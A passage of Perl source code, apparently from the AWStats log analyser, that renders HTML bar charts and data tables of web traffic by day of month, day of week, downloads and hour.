        }
    }
    $average_v = sprintf( "%.2f", $AverageVisits );
    $average_p = sprintf( "%.2f", $AveragePages );
    $average_h = sprintf( "%.2f", $AverageHits );
    $average_k = sprintf( "%.2f", $AverageBytes );

    # Show bars for day
    my $graphdone=0;
    foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
    {
        my @blocklabel = ();
        foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
        {
            $daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
            my $year  = $1;
            my $month = $2;
            my $day   = $3;
            if ( !DateIsValid( $day, $month, $year ) ) {
                next;
            }    # If not an existing day, go to next
            my $bold =
                (      $day == $nowday
                    && $month == $nowmonth
                    && $year == $nowyear ? ':' : '' );
            my $weekend =
                ( DayOfWeek( $day, $month, $year ) =~ /[06]/ ? '!' : '' );
            push @blocklabel,
                "$day\n$MonthNumLib{$month}$weekend$bold";
        }
        my @vallabel = (
            "$Message[10]", "$Message[56]",
            "$Message[57]", "$Message[75]"
        );
        my @valcolor =
            ( "$color_v", "$color_p", "$color_h", "$color_k" );
        my @valmax   = ( $max_v,   $max_h,   $max_h,   $max_k );
        my @valtotal = ( $total_v, $total_p, $total_h, $total_k );
        my @valaverage =
            ( $average_v, $average_p, $average_h, $average_k );
        my @valdata = ();
        my $xx      = 0;

        foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
        {
            $daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
            my $year  = $1;
            my $month = $2;
            my $day   = $3;
            if ( !DateIsValid( $day, $month, $year ) ) {
                next;
            }    # If not an existing day, go to next
            $valdata[ $xx++ ] = $DayVisits{ $year . $month . $day }
                || 0;
            $valdata[ $xx++ ] = $DayPages{ $year . $month . $day } || 0;
            $valdata[ $xx++ ] = $DayHits{ $year . $month . $day }  || 0;
            $valdata[ $xx++ ] = $DayBytes{ $year . $month . $day } || 0;
        }
        my $function = "ShowGraph_$pluginname";
        &$function(
            "$title",              "daysofmonth",
            $ShowDaysOfMonthStats, \@blocklabel,
            \@vallabel,            \@valcolor,
            \@valmax,              \@valtotal,
            \@valaverage,          \@valdata
        );
        $graphdone=1;
    }
    # If graph was not printed by a plugin
    if (! $graphdone) {
        print "<table>\n";
        print "<tr valign=\"bottom\">\n";
        foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
        {
            $daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
            my $year  = $1;
            my $month = $2;
            my $day   = $3;
            if ( !DateIsValid( $day, $month, $year ) ) {
                next;
            }    # If not an existing day, go to next
            my $bredde_v = 0;
            my $bredde_p = 0;
            my $bredde_h = 0;
            my $bredde_k = 0;
            if ( $max_v > 0 ) {
                $bredde_v =
                    int( ( $DayVisits{ $year . $month . $day } || 0 ) /
                        $max_v * $BarHeight ) + 1;
            }
            if ( $max_h > 0 ) {
                $bredde_p =
                    int( ( $DayPages{ $year . $month . $day } || 0 ) /
                        $max_h * $BarHeight ) + 1;
            }
            if ( $max_h > 0 ) {
                $bredde_h =
                    int( ( $DayHits{ $year . $month . $day } || 0 ) /
                        $max_h * $BarHeight ) + 1;
            }
            if ( $max_k > 0 ) {
                $bredde_k =
                    int( ( $DayBytes{ $year . $month . $day } || 0 ) /
                        $max_k * $BarHeight ) + 1;
            }
            print "<td>";
            if ( $ShowDaysOfMonthStats =~ /V/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"4\""
                        . AltTitle( "$Message[10]: "
                        . int( $DayVisits{ $year . $month . $day } || 0 )
                    )
                        . " />";
            }
            if ( $ShowDaysOfMonthStats =~ /P/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"4\""
                        . AltTitle( "$Message[56]: "
                        . int( $DayPages{ $year . $month . $day } || 0 ) )
                        . " />";
            }
            if ( $ShowDaysOfMonthStats =~ /H/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"4\""
                        . AltTitle( "$Message[57]: "
                        . int( $DayHits{ $year . $month . $day } || 0 ) )
                        . " />";
            }
            if ( $ShowDaysOfMonthStats =~ /B/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"4\""
                        . AltTitle(
                        "$Message[75]: "
                            . Format_Bytes(
                            $DayBytes{ $year . $month . $day }
                        )
                    )
                        . " />";
            }
            print "</td>\n";
        }
        print "<td>&nbsp;</td>";

        # Show average value bars
        print "<td>";
        my $bredde_v = 0;
        my $bredde_p = 0;
        my $bredde_h = 0;
        my $bredde_k = 0;
        if ( $max_v > 0 ) {
            $bredde_v = int( $average_v / $max_v * $BarHeight ) + 1;
        }
        if ( $max_h > 0 ) {
            $bredde_p = int( $average_p / $max_h * $BarHeight ) + 1;
        }
        if ( $max_h > 0 ) {
            $bredde_h = int( $average_h / $max_h * $BarHeight ) + 1;
        }
        if ( $max_k > 0 ) {
            $bredde_k = int( $average_k / $max_k * $BarHeight ) + 1;
        }
        $average_v = sprintf( "%.2f", $average_v );
        $average_p = sprintf( "%.2f", $average_p );
        $average_h = sprintf( "%.2f", $average_h );
        $average_k = sprintf( "%.2f", $average_k );
        if ( $ShowDaysOfMonthStats =~ /V/i ) {
            print
                "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"4\""
                    . AltTitle("$Message[10]: $average_v") . " />";
        }
        if ( $ShowDaysOfMonthStats =~ /P/i ) {
            print
                "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"4\""
                    . AltTitle("$Message[56]: $average_p") . " />";
        }
        if ( $ShowDaysOfMonthStats =~ /H/i ) {
            print
                "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"4\""
                    . AltTitle("$Message[57]: $average_h") . " />";
        }
        if ( $ShowDaysOfMonthStats =~ /B/i ) {
            print
                "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"4\""
                    . AltTitle("$Message[75]: $average_k") . " />";
        }
        print "</td>\n";
        print "</tr>\n";

        # Show lib for day
        print "<tr valign=\"middle\">";
        foreach
        my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
        {
            $daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
            my $year  = $1;
            my $month = $2;
            my $day   = $3;
            if ( !DateIsValid( $day, $month, $year ) ) {
                next;
            }    # If not an existing day, go to next
            my $dayofweekcursor = DayOfWeek( $day, $month, $year );
            print "<td"
                . (
                $dayofweekcursor =~ /[06]/
                    ? " bgcolor=\"#$color_weekend\""
                    : ""
            )
                . ">";
            print(
                !$StaticLinks
                    && $day == $nowday
                    && $month == $nowmonth
                    && $year == $nowyear
                    ? '<span class="currentday">'
                    : ''
            );
            print "$day<br /><span style=\"font-size: "
                . (    $FrameName ne 'mainright'
                && $QueryString !~ /buildpdf/i ? "9" : "8" )
                . "px;\">"
                . $MonthNumLib{$month}
                . "</span>";
            print(   !$StaticLinks
                && $day == $nowday
                && $month == $nowmonth
                && $year == $nowyear ? '</span>' : '' );
            print "</td>\n";
        }
        print "<td>&nbsp;</td>";
        print "<td valign=\"middle\""
            . Tooltip(18)
            . ">$Message[96]</td>\n";
        print "</tr>\n";
        print "</table>\n";
    }
    print "<br />\n";

    # Show data array for days
    if ($AddDataArrayShowDaysOfMonthStats) {
        print "<table>\n";
        print
            "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">$Message[4]</td>";
        if ( $ShowDaysOfMonthStats =~ /V/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_v\""
                . Tooltip(1)
                . ">$Message[10]</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /P/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_p\""
                . Tooltip(3)
                . ">$Message[56]</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /H/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_h\""
                . Tooltip(4)
                . ">$Message[57]</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /B/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_k\""
                . Tooltip(5)
                . ">$Message[75]</td>";
        }
        print "</tr>";
        foreach
        my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
        {
            $daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
            my $year  = $1;
            my $month = $2;
            my $day   = $3;
            if ( !DateIsValid( $day, $month, $year ) ) {
                next;
            }    # If not an existing day, go to next
            my $dayofweekcursor = DayOfWeek( $day, $month, $year );
            print "<tr"
                . (
                $dayofweekcursor =~ /[06]/
                    ? " bgcolor=\"#$color_weekend\""
                    : ""
            )
                . ">";
            print "<td>"
                . (
                !$StaticLinks
                    && $day == $nowday
                    && $month == $nowmonth
                    && $year == $nowyear
                    ? '<span class="currentday">'
                    : ''
            );
            print Format_Date( "$year$month$day" . "000000", 2 );
            print(   !$StaticLinks
                && $day == $nowday
                && $month == $nowmonth
                && $year == $nowyear ? '</span>' : '' );
            print "</td>";
            if ( $ShowDaysOfMonthStats =~ /V/i ) {
                print "<td>",
                    Format_Number($DayVisits{ $year . $month . $day }
                        ? $DayVisits{ $year . $month . $day }
                        : "0"), "</td>";
            }
            if ( $ShowDaysOfMonthStats =~ /P/i ) {
                print "<td>",
                    Format_Number($DayPages{ $year . $month . $day }
                        ? $DayPages{ $year . $month . $day }
                        : "0"), "</td>";
            }
            if ( $ShowDaysOfMonthStats =~ /H/i ) {
                print "<td>",
                    Format_Number($DayHits{ $year . $month . $day }
                        ? $DayHits{ $year . $month . $day }
                        : "0"), "</td>";
            }
            if ( $ShowDaysOfMonthStats =~ /B/i ) {
                print "<td>",
                    Format_Bytes(
                        int( $DayBytes{ $year . $month . $day } || 0 ) ),
                    "</td>";
            }
            print "</tr>\n";
        }

        # Average row
        print
            "<tr bgcolor=\"#$color_TableBGRowTitle\"><td>$Message[96]</td>";
        if ( $ShowDaysOfMonthStats =~ /V/i ) {
            print "<td>".Format_Number(int($average_v))."</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /P/i ) {
            print "<td>".Format_Number(int($average_p))."</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /H/i ) {
            print "<td>".Format_Number(int($average_h))."</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /B/i ) {
            print "<td>".Format_Bytes(int($average_k))."</td>";
        }
        print "</tr>\n";

        # Total row
        print
            "<tr bgcolor=\"#$color_TableBGRowTitle\"><td>$Message[102]</td>";
        if ( $ShowDaysOfMonthStats =~ /V/i ) {
            print "<td>".Format_Number($total_v)."</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /P/i ) {
            print "<td>".Format_Number($total_p)."</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /H/i ) {
            print "<td>".Format_Number($total_h)."</td>";
        }
        if ( $ShowDaysOfMonthStats =~ /B/i ) {
            print "<td>" . Format_Bytes($total_k) . "</td>";
        }
        print "</tr>\n";
        print "</table>\n<br />";
    }

    print "</center>\n";
    print "</td></tr>\n";
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Days of the Week section on the main page
# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDaysofWeek{
    my $firstdaytocountaverage = shift;
    my $lastdaytocountaverage = shift;
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowDaysOfWeekStats", 2 ); }
    print "$Center<a name=\"daysofweek\">&nbsp;</a><br />\n";
    my $title = "$Message[91]";
    &tab_head( "$title", 18, 0, 'daysofweek' );
    print "<tr>";
    print "<td align=\"center\">";
    print "<center>\n";

    my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1
    # Get average value for day of week
    my @avg_dayofweek_nb = ();
    my @avg_dayofweek_p  = ();
    my @avg_dayofweek_h  = ();
    my @avg_dayofweek_k  = ();
    foreach my $daycursor (
        $firstdaytocountaverage .. $lastdaytocountaverage )
    {
        $daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
        my $year  = $1;
        my $month = $2;
        my $day   = $3;
        if ( !DateIsValid( $day, $month, $year ) ) {
            next;
        }    # If not an existing day, go to next
        my $dayofweekcursor = DayOfWeek( $day, $month, $year );
        $avg_dayofweek_nb[$dayofweekcursor]
            ++; # Increase number of day used to count for this day of week
        $avg_dayofweek_p[$dayofweekcursor] +=
            ( $DayPages{$daycursor} || 0 );
        $avg_dayofweek_h[$dayofweekcursor] +=
            ( $DayHits{$daycursor} || 0 );
        $avg_dayofweek_k[$dayofweekcursor] +=
            ( $DayBytes{$daycursor} || 0 );
    }
    for (@DOWIndex) {
        if ( $avg_dayofweek_nb[$_] ) {
            $avg_dayofweek_p[$_] =
                $avg_dayofweek_p[$_] / $avg_dayofweek_nb[$_];
            $avg_dayofweek_h[$_] =
                $avg_dayofweek_h[$_] / $avg_dayofweek_nb[$_];
            $avg_dayofweek_k[$_] =
                $avg_dayofweek_k[$_] / $avg_dayofweek_nb[$_];

            #if ($avg_dayofweek_p[$_] > $max_p) { $max_p = $avg_dayofweek_p[$_]; }
            if ( $avg_dayofweek_h[$_] > $max_h ) {
                $max_h = $avg_dayofweek_h[$_];
            }
            if ( $avg_dayofweek_k[$_] > $max_k ) {
                $max_k = $avg_dayofweek_k[$_];
            }
        }
        else {
            $avg_dayofweek_p[$_] = "?";
            $avg_dayofweek_h[$_] = "?";
            $avg_dayofweek_k[$_] = "?";
        }
    }

    # Show bars for days of week
    my $graphdone=0;
    foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
    {
        my @blocklabel = ();
        for (@DOWIndex) {
            push @blocklabel,
                ( $Message[ $_ + 84 ] . ( $_ =~ /[06]/ ? "!" : "" ) );
        }
        my @vallabel =
            ( "$Message[56]", "$Message[57]", "$Message[75]" );
        my @valcolor = ( "$color_p", "$color_h", "$color_k" );
        my @valmax = ( int($max_h), int($max_h), int($max_k) );
        my @valtotal = ( $TotalPages, $TotalHits, $TotalBytes );
        # TEMP
        my $average_p = my $average_h = my $average_k = 0;
        $average_p = sprintf( "%.2f", $AveragePages );
        $average_h = sprintf( "%.2f", $AverageHits );
        $average_k = (
            int($average_k)
                ? Format_Bytes( sprintf( "%.2f", $AverageBytes ) )
                : "0.00"
        );
        my @valaverage = ( $average_p, $average_h, $average_k );
        my @valdata    = ();
        my $xx         = 0;

        for (@DOWIndex) {
            $valdata[ $xx++ ] = $avg_dayofweek_p[$_] || 0;
            $valdata[ $xx++ ] = $avg_dayofweek_h[$_] || 0;
            $valdata[ $xx++ ] = $avg_dayofweek_k[$_] || 0;

            # Round to be ready to show array
            $avg_dayofweek_p[$_] =
                sprintf( "%.2f", $avg_dayofweek_p[$_] );
            $avg_dayofweek_h[$_] =
                sprintf( "%.2f", $avg_dayofweek_h[$_] );
            $avg_dayofweek_k[$_] =
                sprintf( "%.2f", $avg_dayofweek_k[$_] );

            # Remove decimal part that are .0
            if ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {
                $avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );
            }
            if ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {
                $avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );
            }
        }
        my $function = "ShowGraph_$pluginname";
        &$function(
            "$title",             "daysofweek",
            $ShowDaysOfWeekStats, \@blocklabel,
            \@vallabel,           \@valcolor,
            \@valmax,             \@valtotal,
            \@valaverage,         \@valdata
        );
        $graphdone=1;
    }
    if (! $graphdone)
    {
        print "<table>\n";
        print "<tr valign=\"bottom\">\n";
        for (@DOWIndex) {
            my $bredde_p = 0;
            my $bredde_h = 0;
            my $bredde_k = 0;
            if ( $max_h > 0 ) {
                $bredde_p = int(
                    (
                        $avg_dayofweek_p[$_] ne '?'
                            ? $avg_dayofweek_p[$_]
                            : 0
                    ) / $max_h * $BarHeight
                ) + 1;
            }
            if ( $max_h > 0 ) {
                $bredde_h = int(
                    (
                        $avg_dayofweek_h[$_] ne '?'
                            ? $avg_dayofweek_h[$_]
                            : 0
                    ) / $max_h * $BarHeight
                ) + 1;
            }
            if ( $max_k > 0 ) {
                $bredde_k = int(
                    (
                        $avg_dayofweek_k[$_] ne '?'
                            ? $avg_dayofweek_k[$_]
                            : 0
                    ) / $max_k * $BarHeight
                ) + 1;
            }
            $avg_dayofweek_p[$_] = sprintf(
                "%.2f",
                (
                    $avg_dayofweek_p[$_] ne '?'
                        ? $avg_dayofweek_p[$_]
                        : 0
                )
            );
            $avg_dayofweek_h[$_] = sprintf(
                "%.2f",
                (
                    $avg_dayofweek_h[$_] ne '?'
                        ? $avg_dayofweek_h[$_]
                        : 0
                )
            );
            $avg_dayofweek_k[$_] = sprintf(
                "%.2f",
                (
                    $avg_dayofweek_k[$_] ne '?'
                        ? $avg_dayofweek_k[$_]
                        : 0
                )
            );

            # Remove decimal part that are .0
            if ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {
                $avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );
            }
            if ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {
                $avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );
            }
            print "<td valign=\"bottom\">";
            if ( $ShowDaysOfWeekStats =~ /P/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"6\""
                        . AltTitle("$Message[56]: $avg_dayofweek_p[$_]")
                        . " />";
            }
            if ( $ShowDaysOfWeekStats =~ /H/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"6\""
                        . AltTitle("$Message[57]: $avg_dayofweek_h[$_]")
                        . " />";
            }
            if ( $ShowDaysOfWeekStats =~ /B/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
                        . AltTitle( "$Message[75]: "
                        . Format_Bytes( $avg_dayofweek_k[$_] ) )
                        . " />";
            }
            print "</td>\n";
        }
        print "</tr>\n";
        print "<tr" . Tooltip(17) . ">\n";
        for (@DOWIndex) {
            print "<td"
                . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
                . ">"
                . (
                !$StaticLinks
                    && $_ == ( $nowwday - 1 )
                    && $MonthRequired == $nowmonth
                    && $YearRequired == $nowyear
                    ? '<span class="currentday">'
                    : ''
            );
            print $Message[ $_ + 84 ];
            print(   !$StaticLinks
                && $_ == ( $nowwday - 1 )
                && $MonthRequired == $nowmonth
                && $YearRequired == $nowyear ? '</span>' : '' );
            print "</td>";
        }
        print "</tr>\n</table>\n";
    }
    print "<br />\n";

    # Show data array for days of week
    if ($AddDataArrayShowDaysOfWeekStats) {
        print "<table>\n";
        print
            "<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">$Message[4]</td>";
        if ( $ShowDaysOfWeekStats =~ /P/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_p\""
                . Tooltip(3)
                . ">$Message[56]</td>";
        }
        if ( $ShowDaysOfWeekStats =~ /H/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_h\""
                . Tooltip(4)
                . ">$Message[57]</td>";
        }
        if ( $ShowDaysOfWeekStats =~ /B/i ) {
            print "<td width=\"80\" bgcolor=\"#$color_k\""
                . Tooltip(5)
                . ">$Message[75]</td></tr>";
        }
        for (@DOWIndex) {
            print "<tr"
                . ( $_ =~ /[06]/ ? " bgcolor=\"#$color_weekend\"" : "" )
                . ">";
            print "<td>"
                . (
                !$StaticLinks
                    && $_ == ( $nowwday - 1 )
                    && $MonthRequired == $nowmonth
                    && $YearRequired == $nowyear
                    ? '<span class="currentday">'
                    : ''
            );
            print $Message[ $_ + 84 ];
            print(   !$StaticLinks
                && $_ == ( $nowwday - 1 )
                && $MonthRequired == $nowmonth
                && $YearRequired == $nowyear ? '</span>' : '' );
            print "</td>";
            if ( $ShowDaysOfWeekStats =~ /P/i ) {
                print "<td>", Format_Number(int($avg_dayofweek_p[$_])), "</td>";
            }
            if ( $ShowDaysOfWeekStats =~ /H/i ) {
                print "<td>", Format_Number(int($avg_dayofweek_h[$_])), "</td>";
            }
            if ( $ShowDaysOfWeekStats =~ /B/i ) {
                print "<td>", Format_Bytes(int($avg_dayofweek_k[$_])),
                    "</td>";
            }
            print "</tr>\n";
        }
        print "</table>\n<br />\n";
    }

    print "</center></td>";
    print "</tr>\n";
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Downloads chart and table
# Parameters:   -
# Input:        $NewLinkParams, $NewLinkTarget
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDownloads{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;
    if (!$LevelForFileTypesDetection > 0){return;}
    if ($Debug) { debug( "ShowDownloadStats", 2 ); }
    my $regext         = qr/\.(\w{1,6})$/;
    print "$Center<a name=\"downloads\">&nbsp;</a><br />\n";
    my $Totalh = 0;
    if ($MaxNbOf{'DownloadsShown'} < 1){$MaxNbOf{'DownloadsShown'} = 10;}	# default if undefined
    my $title =
        "$Message[178] ($Message[77] $MaxNbOf{'DownloadsShown'}) &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=downloads")
                : "$StaticLinks.downloads.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[80]</a>";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=DOWNLOADS&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 0, 0, 'downloads' );
    my $cnt=0;
    for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
        $Totalh += $_downloads{$u}->{'AWSTATS_HITS'};
        $cnt++;
        if ($cnt > 4){last;}
    }
    # Graph the top five in a pie chart
    if (($Totalh > 0) and (scalar keys %_downloads > 1)){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my @valcolor = ($color_p);
            my $cnt = 0;
            for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
                push @valdata, ($_downloads{$u}->{'AWSTATS_HITS'} / $Totalh * 1000 ) / 10;
                push @blocklabel, Get_Filename($u);
                $cnt++;
                if ($cnt > 4) { last; }
            }
            my $columns = 2;
            if ($ShowDownloadsStats =~ /H/i){$columns += length($ShowDownloadsStats)+1;}
            else{$columns += length($ShowDownloadsStats);}
            print "<tr><td colspan=\"$columns\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "$Message[80]",              "downloads",
                0, 						\@blocklabel,
                0,           			\@valcolor,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }

    my $total_dls = scalar keys %_downloads;
    print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">$Message[178]: $total_dls</th>";
    if ( $ShowDownloadsStats =~ /H/i ){print "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>"
        ."<th bgcolor=\"#$color_h\" width=\"80\">206 $Message[57]</th>"; }
    if ( $ShowDownloadsStats =~ /B/i ){
        print "<th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
        print "<th bgcolor=\"#$color_k\" width=\"80\">$Message[106]</th>";
    }
    print "</tr>\n";
    my $count   = 0;
    for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
        print "<tr>";
        my $ext = Get_Extension($regext, $u);
        if ( !$ext) {
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/mime\/unknown.png\""
                . AltTitle("")
                . " /></td>";
        }
        else {
            my $nameicon = $MimeHashLib{$ext}[0] || "notavailable";
            my $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || "&nbsp;";
            print "<td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/mime\/$nameicon.png\""
                . AltTitle("")
                . " /></td>";
        }
        print "<td class=\"aws\">";
        &HTMLShowURLInfo($u);
        print "</td>";
        if ( $ShowDownloadsStats =~ /H/i ){
            print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_HITS'})."</td>";
            print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_206'})."</td>";
        }
        if ( $ShowDownloadsStats =~ /B/i ){
            print "<td>".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'})."</td>";
            print "<td>".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/
                ($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'})))."</td>";
        }
        print "</tr>\n";
        $count++;
        if ($count >= $MaxNbOf{'DownloadsShown'}){last;}
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the hours chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHours{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowHoursStats", 2 ); }
    print "$Center<a name=\"hours\">&nbsp;</a><br />\n";
    my $title = "$Message[20]";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title = "$title &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=TIME&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    if ( $PluginsLoaded{'GetTimeZoneTitle'}{'timezone'} ) {
        $title .= " (GMT "
            . ( GetTimeZoneTitle_timezone() >= 0 ? "+" : "" )
            . int( GetTimeZoneTitle_timezone() ) . ")";
    }
    &tab_head( "$title", 19, 0, 'hours' );
    print "<tr><td align=\"center\">\n";
    print "<center>\n";

    my $max_h = my $max_k = 1;
    for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {

        #if ($_time_p[$ix]>$max_p) { $max_p=$_time_p[$ix]; }
        if ( $_time_h[$ix] > $max_h ) { $max_h = $_time_h[$ix]; }
        if ( $_time_k[$ix] > $max_k ) { $max_k = $_time_k[$ix]; }
    }

    # Show bars for hour
    my $graphdone=0;
    foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
    {
        my @blocklabel = ( 0 .. 23 );
        my @vallabel   =
            ( "$Message[56]", "$Message[57]", "$Message[75]" );
        my @valcolor = ( "$color_p", "$color_h", "$color_k" );
        my @valmax = ( int($max_h), int($max_h), int($max_k) );
        my @valtotal   = ( $TotalPages,   $TotalHits,   $TotalBytes );
        my @valaverage = ( $AveragePages, $AverageHits, $AverageBytes );
        my @valdata    = ();
        my $xx         = 0;
        for ( 0 .. 23 ) {
            $valdata[ $xx++ ] = $_time_p[$_] || 0;
            $valdata[ $xx++ ] = $_time_h[$_] || 0;
            $valdata[ $xx++ ] = $_time_k[$_] || 0;
        }
        my $function = "ShowGraph_$pluginname";
        &$function(
            "$title",        "hours",
            $ShowHoursStats, \@blocklabel,
            \@vallabel,      \@valcolor,
            \@valmax,        \@valtotal,
            \@valaverage,    \@valdata
        );
        $graphdone=1;
    }
    if (! $graphdone)
    {
        print "<table>\n";
        print "<tr valign=\"bottom\">\n";
        for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
            my $bredde_p = 0;
            my $bredde_h = 0;
            my $bredde_k = 0;
            if ( $max_h > 0 ) {
                $bredde_p =
                    int( $BarHeight * $_time_p[$ix] / $max_h ) + 1;
            }
            if ( $max_h > 0 ) {
                $bredde_h =
                    int( $BarHeight * $_time_h[$ix] / $max_h ) + 1;
            }
            if ( $max_k > 0 ) {
                $bredde_k =
                    int( $BarHeight * $_time_k[$ix] / $max_k ) + 1;
            }
            print "<td>";
            if ( $ShowHoursStats =~ /P/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"6\""
                        . AltTitle( "$Message[56]: " . int( $_time_p[$ix] ) )
                        . " />";
            }
            if ( $ShowHoursStats =~ /H/i ) {
                print
                    "<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"6\""
                        . AltTitle( "$Message[57]: " . int( $_time_h[$ix] ) )
                        . " />";
            }
            if ( $ShowHoursStats =~ /B/i ) {
                print
